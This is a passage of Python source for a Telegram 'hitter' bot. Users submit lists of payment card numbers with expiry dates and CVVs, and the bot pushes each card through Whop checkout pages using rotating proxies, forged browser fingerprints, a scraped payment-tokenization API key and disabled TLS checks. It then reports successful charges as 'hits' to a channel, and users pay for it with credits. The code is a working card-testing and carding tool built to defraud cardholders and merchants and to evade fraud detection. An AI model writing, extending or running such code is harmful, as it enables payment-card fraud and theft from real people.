            lpe = payment.get(k)
            if isinstance(lpe, dict):
                msg = lpe.get("message")
                if msg:
                    return msg
                decline = lpe.get("decline_code")
                if decline:
                    return f"Declined: {decline}"
        if payment.get("decline_code"):
            return f"Declined: {payment['decline_code']}"
        if payment.get("status", "").lower() in ("failed", "declined", "canceled"):
            return payment.get("message") or payment["status"]

    if resp.get("decline_code"):
        return f"Declined: {resp['decline_code']}"
    if resp.get("status", "").lower() in ("failed", "declined", "canceled"):
        return resp.get("message") or resp["status"]
    if resp.get("error"):
        error = resp.get("error")
        if isinstance(error, str):
            return error
        if isinstance(error, dict):
            return error.get("message") or str(error)

    return None

def safe_format_amount(amount: Any, currency: str = "USD") -> str:
    """
    Safely format amount with currency code.
    Amount is expected to be in cents (e.g., 2995 = $29.95)
    """
    if amount is None or amount == "":
        return "N/A"

    try:
        if isinstance(amount, str):
            amount = float(amount) if amount.replace('.', '', 1).isdigit() else 0
        elif not isinstance(amount, (int, float)):
            amount = 0


        if amount > 1000:
            amount = amount / 100

        return f"{amount:.2f} {currency.upper()}"
    except (ValueError, TypeError, ZeroDivisionError):
        return f"{amount} {currency.upper()}" if amount else "N/A"


def request_with_retry(session, method: str, url: str, max_retries: int = 5,
                       initial_delay: int = 1, **kwargs):
    """
    Make a request with automatic retry on proxy timeouts/errors and SSL errors.
    Uses exponential backoff.

    WHY TLS (curl: 35) ERRORS OCCUR:
    Some proxies in the list are plain HTTP-only tunnels (e.g. port 8080) that
    cannot forward TLS/HTTPS traffic. When curl_cffi tries to do an HTTPS
    handshake through such a proxy, the proxy replies with plain HTTP — causing
    OpenSSL to throw WRONG_VERSION_NUMBER (error:100000f7 / curl code 35).
    Retrying with the SAME proxy always fails. The fix is to pick a completely
    DIFFERENT proxy from the global pool on every SSL retry.
    """
    last_exception = None
    delay = initial_delay


    kwargs['verify'] = False

    for attempt in range(max_retries):
        try:
            if 'timeout' not in kwargs:
                kwargs['timeout'] = 45

            return session.request(method, url, **kwargs)

        except Exception as e:
            last_exception = e
            error_str = str(e).lower()


            is_ssl_error = any([
                "ssl" in error_str and "wrong_version_number" in error_str,
                "ssl connect error" in error_str,
                "curl: (35)" in error_str,
                "wrong version number" in error_str,
                "tls connect error" in error_str,
                "error:100000f7" in error_str,
                "ssl routines" in error_str and "wrong_version" in error_str,
                "tlsv1" in error_str and "alert protocol version" in error_str,
                "ssl" in error_str and "protocol" in error_str,
            ])


            is_proxy_error = any([
                "timeout" in error_str,
                "timed out" in error_str,
                "proxy" in error_str,
                "connection" in error_str and "refused" in error_str,
                "connection" in error_str and "reset" in error_str,
                "closed" in error_str and "connection" in error_str,
                "eof" in error_str,
                "curl" in error_str and ("28" in error_str or "7" in error_str or "52" in error_str),
                "connection" in error_str and "aborted" in error_str,
                "bad gateway" in error_str,
                "502" in error_str,
                "503" in error_str,
                "504" in error_str,
            ])

            should_retry = is_proxy_error or is_ssl_error

            if should_retry and attempt < max_retries - 1:
                jitter = random.uniform(0, 0.3)
                wait_time = delay + jitter

                if is_ssl_error:


                    try:
                        current_proxy = (
                            kwargs.get('proxies', {}).get('https')
                            or kwargs.get('proxies', {}).get('http', '')
                        )
                        fresh_pool = [p for p in PROXIES if p != current_proxy]
                        new_proxy = random.choice(fresh_pool) if fresh_pool else random.choice(PROXIES)
                        kwargs['proxies'] = {"http": new_proxy, "https": new_proxy}
                        session.cookies.clear()
                        logger.warning(
                            f"SSL/TLS error — switching to fresh proxy, retry {attempt + 1}/{max_retries}"
                        )
                    except Exception:
                        pass
                else:
                    logger.debug(f"Proxy error, retrying in {wait_time:.1f}s (attempt {attempt + 1}/{max_retries})")

                time.sleep(wait_time)
                continue
            else:
                break

    if last_exception:
        raise last_exception
    return None


async def process_whop(url: str, cc: Dict[str, str], proxy: str) -> Dict[str, Any]:
    """Process a single Whop checkout with a card."""

    session = curl_requests.Session(impersonate="chrome120")
    proxies = {"http": proxy, "https": proxy}

    fp = random_fingerprint()


    wuid = f"wuid_{uuid.uuid4().hex[:16]}"
    ajs_id = str(uuid.uuid4())
    whop_anon = str(uuid.uuid4())
    ssk = str(uuid.uuid4())

    parsed = urlparse(url)
    affiliate = parse_qs(parsed.query).get("a", [""])[0]
    slug = parsed.path.strip("/").split("/")[-1] if parsed.path else ""


    amount = 0
    currency = "USD"
    decline_message = None

    try:


        headers_get_doc = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "priority": "u=0, i",
            "sec-ch-ua": SEC_CH_UA,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": USER_AGENT,
        }


        initial_cookies = {}
        if affiliate:
            initial_cookies["__Host-affiliate_code"] = affiliate
            if slug:
                initial_cookies[f"__Host-whop-core.affiliate-{slug}"] = affiliate
                initial_cookies[f"whop-core.affiliate-{slug}"] = affiliate

        initial_cookies["_wuid"] = wuid
        initial_cookies["_wuid_link"] = wuid
        initial_cookies["ajs_anonymous_id"] = ajs_id
        initial_cookies["whop_anonymous_id"] = whop_anon
        initial_cookies["whop-core.ssk"] = ssk
        initial_cookies["_whop_ssk"] = ssk

        for k, v in initial_cookies.items():
            session.cookies.set(k, v, domain="whop.com")

        r1 = await asyncio.to_thread(
            request_with_retry, session, "GET", url,
            headers=headers_get_doc, proxies=proxies, timeout=30
        )
        html = r1.text

        plan_id, account_id, container, release, product_id, slug_extracted = extract_dynamic(html)
        if not plan_id or not account_id:
            return {
                "error": {"message": "Could not extract plan/account ID", "decline_code": "extraction_failed"},
                "checkout_amount": 0,
                "checkout_currency": "USD",
                "decline_message": "Extraction failed"
            }

        if slug_extracted:
            slug = slug_extracted


        tracking_link_id = None
        if affiliate and product_id:
            try:
                t_resolve = generate_trace()
                resolve_headers = {
                    "accept": "*/*",
                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/json",
                    "origin": "https://whop.com",
                    "referer": url,
                    "sec-ch-ua": SEC_CH_UA,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "sentry-trace": f"{t_resolve}-{generate_span()}-1",
                    "baggage": generate_baggage(t_resolve, release),
                    "user-agent": USER_AGENT,
                }
                r_resolve = await asyncio.to_thread(
                    request_with_retry, session, "POST",
                    "https://whop.com/api/affiliate/resolve-tracking/",
                    json={"companyId": account_id, "accessPassId": product_id},
                    headers=resolve_headers, proxies=proxies, timeout=30
                )
                if r_resolve and r_resolve.status_code == 200:
                    d_resolve = r_resolve.json()
                    tracking_link_id = d_resolve.get("tracking_link_id") or d_resolve.get("id") or d_resolve.get("trackingLinkId")
                    if tracking_link_id:
                        session.cookies.set(f"__Host-whop-core.tracking-link-{account_id}", tracking_link_id, domain="whop.com")
                        session.cookies.set(f"whop-core.tracking-link-{account_id}", tracking_link_id, domain="whop.com")
            except Exception as e:
                logger.debug(f"Affiliate resolve failed: {e}")


        try:
            await asyncio.to_thread(
                request_with_retry, session, "GET",
                f"https://whop.com/api/v1/accounts/{account_id}/tracking_pixels",
                headers={
                    "accept": "application/json",
                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                    "referer": url,
                    "sec-ch-ua": SEC_CH_UA,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": USER_AGENT,
                },
                proxies=proxies, timeout=15
            )
        except Exception:
            pass


        btapi = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
        env_match = re.search(r'href="(/_web/assets/[^/]+/env-[a-zA-Z0-9_-]+\.js)"', html)
        if env_match:
            try:
                env_url = "https://whop.com" + env_match.group(1)
                r_env = await asyncio.to_thread(
                    request_with_retry, session, "GET", env_url,
                    headers=headers_get_doc, proxies=proxies, timeout=30
                )
                bt_match = re.search(r'VITE_PAYOUTS_BASIS_THEORY_API_KEY:\s*[`\'"]([^`\'"]+)[`\'"]', r_env.text)
                if bt_match:
                    btapi = bt_match.group(1)
            except Exception:
                pass

        def whop_headers(trace_id, extra=None, is_doc=False):
            h = {
                "accept": "*/*",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "api-version-date": "2026-08-21-1",
                "origin": "https://whop.com",
                "referer": url,
                "sec-ch-ua": SEC_CH_UA,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "document" if is_doc else "empty",
                "sec-fetch-mode": "navigate" if is_doc else "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "priority": "u=1, i",
                "sentry-trace": f"{trace_id}-{generate_span()}-1",
                "baggage": generate_baggage(trace_id, release),
                "whop-private-schema": "true",
                "x-fern-language": "JavaScript",
                "x-fern-runtime": "browser",
                "x-fern-runtime-version": USER_AGENT,
                "user-agent": USER_AGENT,
                "x-ssk": ssk,
            }
            if extra:
                h.update(extra)
            return h


        t2 = generate_trace()
        payload2 = {
            "items": [{"plan": plan_id, "quantity": 1}],
            "tracking_link_ids_by_account": {}
        }

        if affiliate:
            payload2["affiliate_code"] = affiliate
            payload2["attribution"] = {"source": "product_page_direct"}
        if tracking_link_id and account_id:
            payload2["tracking_link_ids_by_account"] = {account_id: tracking_link_id}

        r2 = await asyncio.to_thread(
            request_with_retry, session, "POST",
            "https://whop.com/api/v1/checkout_sessions",
            json=payload2,
            headers=whop_headers(t2),
            proxies=proxies, timeout=30
        )
        if r2.status_code >= 400:
            return {
                "error": {"message": f"Checkout session failed: {r2.status_code}", "decline_code": "checkout_failed"},
                "checkout_amount": 0,
                "checkout_currency": "USD",
                "decline_message": f"Checkout session failed: {r2.status_code}"
            }

        d2 = r2.json()
        chs_id = d2.get("id", "")
        client_secret = d2.get("client_secret", "")
        account_id = d2.get("seller", {}).get("id", account_id)
        email = d2.get("buyer_email") or cc.get("email", random_email())
        quote = d2.get("quote", {})


        raw_amount = quote.get("base_amount", 0)
        try:
            amount = float(raw_amount) if raw_amount else 0
        except (ValueError, TypeError):
            amount = 0
        currency = quote.get("base_currency", "USD").upper()

        if not chs_id or not client_secret:
            return {
                "error": {"message": "No checkout session ID or client secret", "decline_code": "checkout_failed"},
                "checkout_amount": amount,
                "checkout_currency": currency,
                "decline_message": "No checkout session ID or client secret"
            }

        session.cookies.set(f"whop_checkout_key_{chs_id}", client_secret, domain="whop.com")


        t3 = generate_trace()
        try:
            r3 = await asyncio.to_thread(
                request_with_retry, session, "POST",
                f"https://whop.com/api/v1/checkout_sessions/{chs_id}/calculate_breakdown",
                json={"client_secret": client_secret, "supports_buyer_fee": True},
                headers=whop_headers(t3),
                proxies=proxies, timeout=30
            )
            if r3.status_code == 200:
                d3 = r3.json()
                total = d3.get("total", {})
                if total.get("amount"):
                    try:
                        amount = float(total["amount"])
                    except (ValueError, TypeError):
                        pass
                    currency = total.get("currency", "USD").upper()
        except Exception:
            pass


        try:
            conv_fp = uuid.uuid4().hex[:32]
            await asyncio.to_thread(
                request_with_retry, session, "POST",
                "https://t.whop.tw/conversions",
                json={
                    "event_name": "identify",
                    "company_id": account_id,
                    "event_time": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z"),
                    "url": url,
                    "user": {
                        "anonymous_id": wuid,
                        "linked_anonymous_id": ajs_id
                    },
                    "context": {
                        "user_agent": USER_AGENT,
                        "screen_resolution": f"{fp['screen_w']}x{fp['screen_h']}",
                        "language": fp["lang"],
                        "timezone": fp["tz"],
                        "fingerprint": conv_fp,
                        "fingerprint_confidence": round(random.uniform(0.3, 0.6), 2)
                    },
                    "referrer_url": url,
                    "source": "link"
                },
                headers={
                    "accept": "*/*",
                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/json",
                    "origin": "https://whop.com",
                    "referer": "https://whop.com/",
                    "sec-ch-ua": SEC_CH_UA,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                    "user-agent": USER_AGENT,
                },
                proxies=proxies, timeout=15
            )
        except Exception:
            pass


        device_info = {
            "uaBrands": [
                {"brand": "Not_A Brand", "version": "8"},
                {"brand": "Chromium", "version": "120"},
                {"brand": "Google Chrome", "version": "120"}
            ],
            "uaMobile": False,
            "uaPlatform": "Windows" if fp["platform"] == "Win32" else "macOS",
            "languages": [fp["lang"], "en"],
            "timeZone": fp["tz"],
            "cookiesEnabled": True,
            "localStorageEnabled": True,
            "sessionStorageEnabled": True,
            "platform": fp["platform"],
            "hardwareConcurrency": fp["hw"],
            "deviceMemoryGb": fp["mem"],
            "screenWidth": fp["screen_w"],
            "screenHeight": fp["screen_h"],
            "screenAvailWidth": fp["screen_w"],
            "screenAvailHeight": fp["screen_h"] - 40,
            "innerWidth": fp["inner_w"],
            "innerHeight": fp["inner_h"],
            "devicePixelRatio": fp["dpr"],
            "maxTouchPoints": 0,
            "network": {},
            "plugins": fp["plugins"],
            "mimeTypes": ["application/pdf", "text/pdf"],
            "webdriver": False,
            "suspectedHeadless": False,
            "webglVendor": fp["vendor"],
            "webglRenderer": fp["renderer"]
        }
        bt_device_info_b64 = base64.b64encode(json.dumps(device_info).encode()).decode()

        bt_headers = {
            "accept": "*/*",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "bt-api-key": btapi,
            "origin": "https://js.basistheory.com",
            "referer": "https://js.basistheory.com/web-elements/2.12.2/hosted-elements/data-element.html?element_id",
            "sec-ch-ua": SEC_CH_UA,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-storage-access": "active",
            "user-agent": USER_AGENT,
        }

        r4 = await asyncio.to_thread(
            request_with_retry, session, "POST",
            "https://js.basistheory.com/api/sessions",
            json={"deviceInfo": device_info},
            headers=bt_headers,
            proxies=proxies, timeout=30
        )
        conkey = ""
        conon = ""
        try:
            d4 = r4.json()
            conkey = d4.get("session_key", "")
            conon = d4.get("nonce", "")
        except Exception:
            pass


        t5 = generate_trace()
        ws_headers = whop_headers(t5)
        ws_headers["referer"] = url
        r5 = await asyncio.to_thread(
            request_with_retry, session, "POST",
            "https://whop.com/api/v1/payment_method_types/card/session",
            json={"account_id": account_id, "nonce": conon},
            headers=ws_headers,
            proxies=proxies, timeout=30
        )
        try:
            d5 = r5.json()
            sc = d5.get("session", {}).get("container")
            if sc:
                container = sc if sc.startswith("/") else "/" + sc
                if not container.endswith("/"):
                    container += "/"
        except Exception:
            pass
        if not container:
            container = "/card-assembly/cda4721bfd122ff8420a0bf4f47ea32e14125ef7d90d933bacb1a0b7fa9e82dd/"


        exp_year = int(cc["year"])
        if exp_year < 100:
            exp_year += 2000

        expires_at = (datetime.now(timezone.utc) + timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S.000Z")

        token_headers = {**bt_headers, "bt-api-key": btapi, "bt-device-info": bt_device_info_b64, "content-type": "application/json"}
        r6 = await asyncio.to_thread(
            request_with_retry, session, "POST",
            "https://js.basistheory.com/api/tokens",
            json={"type": "card", "containers": [container], "expires_at": expires_at, "data": {"number": cc["number"]}},
            headers=token_headers,
            proxies=proxies, timeout=30
        )
        card_token = None
        try:
            card_token = r6.json().get("id")
        except Exception:
            pass
        if not card_token:
            return {
                "error": {"message": "Failed to tokenize card", "decline_code": "tokenization_failed"},
                "checkout_amount": amount,
                "checkout_currency": currency,
                "decline_message": "Failed to tokenize card"
            }


        patch_headers = {
            **bt_headers,
            "bt-api-key": conkey,
            "bt-device-info": bt_device_info_b64,
            "content-type": "application/merge-patch+json",
            "referer": "https://js.basistheory.com/web-elements/2.12.2/hosted-elements/card-expiration-date-element.html?element_id=0da4cabc-a41a-4109-b050-eaad46bbc48b",
        }
        await asyncio.to_thread(
            request_with_retry, session, "PATCH",
            f"https://js.basistheory.com/api/tokens/{card_token}",
            json={"data": {"expiration_month": int(cc["month"]), "expiration_year": exp_year}},
            headers=patch_headers,
            proxies=proxies, timeout=30
        )


        patch_headers["referer"] = "https://js.basistheory.com/web-elements/2.12.2/hosted-elements/card-verification-code-element.html?element_id=f4fa4112-998a-49d6-bf4b-691e08d3cfe0"
        await asyncio.to_thread(
            request_with_retry, session, "PATCH",
            f"https://js.basistheory.com/api/tokens/{card_token}",
            json={"data": {"cvc": cc["cvv"]}},
            headers=patch_headers,
            proxies=proxies, timeout=30
        )


        t9 = generate_trace()
        h9 = whop_headers(t9, {"authorization": "Bearer public", "referer": f"{url}?session={chs_id}"})
        payload9 = {
            "account_id": account_id,
            "payment_method": {"type": "card", "category": "card", "card": {"token": card_token}},
            "setup_future_usage": "off_session",
            "billing_details": {
                "email": email,
                "name": cc.get("name", random_name()),
                "address": {
                    "country": cc.get("country", "US"),
                    "line1": cc.get("line1", "123 Main St"),
                    "city": cc.get("city", "New York"),
                    "state": cc.get("state", "NY"),
                    "postal_code": cc.get("postal", "10001")
                }
            },
            "return_url": f"{url}?session={chs_id}",
            "browser_info": {
                "platform": fp["platform"],
                "color_depth": 24,
                "screen_height": fp["screen_h"],
                "screen_width": fp["screen_w"],
                "javascript_enabled": True,
                "language": fp["lang"],
                "java_enabled": False,
                "browser_time_difference": fp["tz_offset"]
            }
        }
        r9 = await asyncio.to_thread(
            request_with_retry, session, "POST",
            "https://whop.com/api/v1/confirmation_tokens",
            json=payload9,
            headers=h9,
            proxies=proxies, timeout=30
        )
        ctok_id = None
        try:
            ctok_id = r9.json().get("id")
        except Exception:
            pass
        if not ctok_id:
            return {
                "error": {"message": "Failed to create confirmation token", "decline_code": "confirmation_failed"},
                "checkout_amount": amount,
                "checkout_currency": currency,
                "decline_message": "Failed to create confirmation token"
            }


        t10 = generate_trace()
        h10 = whop_headers(t10, {"referer": f"{url}?session={chs_id}"})
        payload10 = {
            "client_secret": client_secret,
            "confirmation_token": ctok_id,
            "attestations": {"tos_accepted": True}
        }
        r10 = await asyncio.to_thread(
            request_with_retry, session, "POST",
            f"https://whop.com/api/v1/checkout_sessions/{chs_id}/confirm",
            json=payload10,
            headers=h10,
            proxies=proxies, timeout=30
        )
        conf_json = {}
        try:
            conf_json = r10.json()
        except Exception:
            pass


        for poll_attempt in range(12):
            cs_status = conf_json.get("status", "")
            payment = conf_json.get("payment") or {}
            pay_status = payment.get("status", "")
            err_obj = conf_json.get("last_confirm_error") or conf_json.get("last_confirmation_error")
            next_action = conf_json.get("next_action") or {}
            na_type = next_action.get("type", "")

            msg = get_message_from_response(conf_json)
            if msg:
                decline_message = msg
                if "insufficient" in msg.lower():
                    return {
                        "error": {"message": msg, "decline_code": "insufficient_funds"},
                        "checkout_amount": amount,
                        "checkout_currency": currency,
                        "decline_message": msg
                    }
                return {
                    "error": {"message": msg, "decline_code": "payment_error"},
                    "checkout_amount": amount,
                    "checkout_currency": currency,
                    "decline_message": msg
                }

            if na_type in ("use_stripe_sdk", "redirect_to_url", "3ds", "complete"):
                return {
                    "error": {"message": "3D Secure required", "decline_code": "authentication_required"},
                    "checkout_amount": amount,
                    "checkout_currency": currency,
                    "decline_message": "3D Secure required"
                }

            if pay_status == "succeeded" or (cs_status == "completed" and not err_obj and pay_status not in ("processing", "requires_action")):
                return {
                    "success": True,
                    "token": chs_id,
                    "checkout_amount": amount,
                    "checkout_currency": currency,
                    "status": "succeeded",
                    "message": "Payment Successful"
                }

            if cs_status in ("failed", "expired"):
                decline_msg = get_message_from_response(conf_json) or f"Failed: {cs_status}"
                if "insufficient" in decline_msg.lower():
                    return {
                        "error": {"message": decline_msg, "decline_code": "insufficient_funds"},
                        "checkout_amount": amount,
                        "checkout_currency": currency,
                        "decline_message": decline_msg
                    }
                return {
                    "error": {"message": decline_msg, "decline_code": cs_status},
                    "checkout_amount": amount,
                    "checkout_currency": currency,
                    "decline_message": decline_msg
                }

            if na_type == "wait_for_payment" and cs_status in ("open", "completed") and pay_status in ("processing", None, ""):
                poll_secs = next_action.get("poll_after_seconds", 3)
                await asyncio.sleep(poll_secs)
                t_p = generate_trace()
                r_p = await asyncio.to_thread(
                    request_with_retry, session, "GET",
                    f"https://whop.com/api/v1/checkout_sessions/{chs_id}",
                    params={"client_secret": client_secret},
                    headers=whop_headers(t_p),
                    proxies=proxies, timeout=30
                )
                try:
                    conf_json = r_p.json()
                except Exception:
                    pass
                continue

            break


        final_status = conf_json.get("status", "")
        final_pay_status = (conf_json.get("payment") or {}).get("status", "")
        final_error = conf_json.get("last_confirm_error") or conf_json.get("last_confirmation_error")

        if final_pay_status == "succeeded" or (final_status == "completed" and not final_error):
            return {
                "success": True,
                "token": chs_id,
                "checkout_amount": amount,
                "checkout_currency": currency,
                "status": "succeeded",
                "message": "Payment Successful"
            }


        final_msg = get_message_from_response(conf_json) or f"Unknown: status={final_status} pay={final_pay_status}"

        if final_error and "insufficient" in str(final_error).lower():
            return {
                "error": {"message": str(final_error), "decline_code": "insufficient_funds"},
                "checkout_amount": amount,
                "checkout_currency": currency,
                "decline_message": final_msg
            }

        return {
            "error": {"message": final_msg, "decline_code": "unknown_error"},
            "checkout_amount": amount,
            "checkout_currency": currency,
            "decline_message": final_msg
        }

    except Exception as e:
        logger.error(f"Whop processing error: {e}")
        return {
            "error": {"message": str(e), "decline_code": "api_error"},
            "checkout_amount": amount if isinstance(amount, (int, float)) else 0,
            "checkout_currency": currency,
            "decline_message": str(e)
        }


async def send_hit_message(bot: Bot, response_type: str, amount: str, user_name: str, user_id: int, emoji_id: str = None):
    """Sends the Hit Detect message to the channel."""
    try:
        user_link = f"<a href='tg://user?id={user_id}'>{html.escape(user_name)}</a>"


        if emoji_id:
            emoji_part = f'<tg-emoji emoji-id="{emoji_id}">🔥</tg-emoji>'
        else:
            emoji_part = "🔥"

        hit_msg = (
            f"<b><a href='https://t.me/Try_Low'>[  ɧ ι 𝛕  ]</a></b> <b>➵ Wʜᴏᴘ Cʜᴇᴄᴋᴏᴜᴛ</b> {emoji_part}\n"
            f"<b>Aᴍᴏᴜɴᴛ ➵ {html.escape(amount)}</b>\n"
            f"<b>Rᴀᴡ ➵</b> <code>{html.escape(response_type)}</code>\n"
            f"<b>Usᴇʀ ➵ {user_link}</b>"
        )

        reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="𝘾𝙃𝙆 𝕏 [𝙒 𝙄 𝙕] ", url=BOT,
        icon_custom_emoji_id="5445104308884370368")]
    ])

        await bot.send_message(
            chat_id=HIT_CHANNEL_ID,
            text=hit_msg,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Failed to send hit message: {e}")


@router.message(F.text.startswith("/hit"))
async def whop_command(message: types.Message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"
    username = message.from_user.username

    url = ""
    raw_cards = []


    text_content = message.text or ""
    parts = text_content.split()[1:] if " " in text_content else []

    if parts:
        potential_url = parts[0]
        if potential_url.startswith("http"):
            url = potential_url
            raw_cards.extend(parts[1:])


    if message.reply_to_message:
        replied_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_cards.extend(replied_text.split('\n'))


    if not url:
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Invalid Format!</b>\n\n"
            "Usage: <code>/hit &lt;whop_checkout_link&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n"
            "Or reply to a list of cards.\n\n"
            "<b>Card Format:</b> <code>4111111111111111|12|26|123</code>",
            parse_mode="HTML"
        )
        return


    card_pattern = re.compile(r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})')

    valid_cards = []
    seen = set()

    for item in raw_cards:
        match = card_pattern.search(item)
        if match:
            cc, mm, yy, cvv = match.groups()
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]


            if not luhn_check(cc):
                continue

            formatted = f"{cc}|{mm}|{yy}|{cvv}"
            if formatted not in seen:
                seen.add(formatted)
                valid_cards.append(formatted)


    if len(valid_cards) > MAX_CARDS:
        await message.reply(
            f"<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Limit Exceeded!</b>\n\nMax allowed: {MAX_CARDS}",
            parse_mode="HTML"
        )
        return

    if not valid_cards:
        await message.reply("⚠️ No valid cards found.", parse_mode="HTML")
        return


    try:
        await asyncio.to_thread(create_user, user_id, username)
        current_credits = await asyncio.to_thread(get_user_credits, user_id)

        if current_credits is None or current_credits < 1:
            await message.reply(
                "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs</b>\n\n"
                "Yᴏᴜ Nᴇᴇᴅ Aᴛ Lᴇᴀsᴛ <b>1 Cʀᴇᴅɪᴛ</b> Tᴏ Usᴇ Tʜɪs Gᴀᴛᴇ.\n"
                "Usᴇ /plan Tᴏ Gᴇᴛ Mᴏʀᴇ.",
                parse_mode="HTML"
            )
            return

        new_balance = current_credits - 1
        await asyncio.to_thread(update_credits, user_id, new_balance)

        logger.info(f"[WHOP] User {user_id} deducted 1 credit. Old: {current_credits} -> New: {new_balance}")

    except Exception as e:
        logger.error(f"Failed to process credits for user {user_id}: {e}")
        await message.reply("⚠️ <b>Database Error.</b>\nCould not verify credits. Please try again.", parse_mode="HTML")
        return


    asyncio.create_task(
        run_whop_check(message, url, valid_cards, user_name, user_id)
    )


async def run_whop_check(message: types.Message, url: str, cards: List[str], user_name: str, user_id: int):
    start_time = time.time()
    total_cards = len(cards)
    user_link = f"<a href='tg://user?id={user_id}'>{html.escape(user_name)}</a>"
    bot = message.bot


    status_msg = await message.reply(
        f'<b><a href="https://t.me/Try_Low">⬢</a> Gᴀᴛᴇ ➵ Wʜᴏᴘ Hɪᴛᴛᴇʀ</b>\n'
        f'<b><a href="https://t.me/Try_Low">⬡</a> Pʀᴏɢʀᴇss ➵ 0/{total_cards}</b>\n'
        f'<b><a href="https://t.me/Try_Low">⬢</a> Aᴍᴏᴜɴᴛ ➵ N/A</b>\n'
        f'<b><a href="https://t.me/Try_Low">⬡</a> Sᴛᴀᴛᴜs ➵ Hɪᴛᴛɪɴɢ…</b>\n'
        f"━━━━━━━━━━━━━━━━",
        parse_mode="HTML", disable_web_page_preview=True
    )
    msg_id = status_msg.message_id


    WHOP_SESSIONS[msg_id] = {
        "results": [],
        "page": 0,
        "total_cards": total_cards,
        "start_time": start_time,
        "user_name": user_name,
        "user_id": user_id,
        "msg_id": msg_id,
        "amount": "N/A",
        "currency": "USD",
        "final_status": "checking",
        "current_card": None,
        "stopped": False,
        "tasks": []
    }


    sem = asyncio.Semaphore(3)

    async def worker(card_str: str):
        async with sem:

            WHOP_SESSIONS[msg_id]["current_card"] = card_str
            try:
                _elapsed = round(time.time() - start_time, 2)
                _text = format_page_content(WHOP_SESSIONS[msg_id], _elapsed, is_working=True)
                await status_msg.edit_text(_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
            except Exception:
                pass


            parts = card_str.split('|')
            if len(parts) < 4:
                WHOP_SESSIONS[msg_id]["current_card"] = None
                return {
                    "card": card_str,
                    "resp": "invalid_format",
                    "status": "error",
                    "display": "Invalid Format",
                    "emoji": EMOJI_DECLINED
                }

            cc_data = {
                "number": parts[0].strip(),
                "month": parts[1].strip().zfill(2),
                "year": parts[2].strip(),
                "cvv": parts[3].strip(),
                "email": random_email(),
                "name": random_name(),
                **random_address()
            }


            proxy = random.choice(PROXIES)

            try:
                res = await process_whop(url, cc_data, proxy)


                raw_amount = res.get('checkout_amount', 0)
                currency = res.get('checkout_currency', 'USD')
                error = res.get('error', {})
                code = error.get('decline_code', 'succeeded') if error else 'succeeded'
                decline_msg = res.get('decline_message', '')


                if raw_amount and WHOP_SESSIONS[msg_id]["amount"] == "N/A":
                    WHOP_SESSIONS[msg_id]["amount"] = safe_format_amount(raw_amount, currency)
                    WHOP_SESSIONS[msg_id]["currency"] = currency


                if res.get('success', False):
                    display = "Payment Successful"
                    emoji = EMOJI_CHARGED
                    is_hit = True
                elif code == 'authentication_required':
                    display = "3D Secure Required"
                    emoji = EMOJI_DECLINED
                    is_hit = False
                elif 'insufficient' in str(code).lower() or 'insufficient' in str(decline_msg).lower():
                    display = "Insufficient Funds"
                    emoji = EMOJI_INSUFFICIENT
                    is_hit = True
                else:
                    if decline_msg:
                        display = decline_msg
                    else:
                        display = code.replace('_', ' ').title()
                    emoji = EMOJI_DECLINED
                    is_hit = False


                if is_hit:
                    amount_display = safe_format_amount(raw_amount, currency)
                    asyncio.create_task(
                        send_hit_message(
                            bot,
                            display,
                            amount_display,
                            user_name,
                            user_id,
                            emoji
                        )
                    )

                result = {
                    "card": card_str,
                    "resp": code,
                    "status": "approved" if is_hit else "declined",
                    "display": display,
                    "emoji": emoji
                }

            except Exception as e:
                logger.error(f"Worker error: {e}")
                result = {
                    "card": card_str,
                    "resp": "script_error",
                    "status": "error",
                    "display": str(e),
